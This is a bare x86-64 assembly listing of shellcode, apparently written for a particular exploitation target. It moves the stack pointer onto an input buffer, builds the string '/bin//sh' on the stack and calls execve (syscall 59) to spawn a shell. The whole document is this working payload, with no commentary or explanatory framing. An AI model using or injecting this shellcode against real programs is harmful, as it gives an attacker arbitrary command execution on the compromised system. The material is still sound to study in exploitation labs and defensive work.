global _start
section .text
_start:
  mov rsp,rsi
  add rsp,0x3c
  xor rsi,rsi
  push rsi
  mov rdi,0x68732f2f6e69622f
  push rdi
  push rsp
  pop rdi
  push 59
  pop rax
  cdq
  syscall
